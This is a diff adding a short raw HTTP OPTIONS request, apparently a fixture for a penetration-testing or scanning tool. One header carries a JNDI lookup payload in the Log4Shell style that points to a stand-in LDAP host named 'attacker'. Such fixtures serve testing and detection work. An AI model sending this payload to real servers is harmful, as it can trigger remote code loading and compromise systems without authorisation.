@@ -1,0 +1,8 @@
+OPTIONS / HTTP/1.1
+Host: test
+User-Agent: Mozilla/5.0 (penetration-framework)
+Accept: */*
+Accept-Encoding: identity
+Connection: keep-alive
+X-Custom-Test: %{jndi:ldap://attacker/test}
+
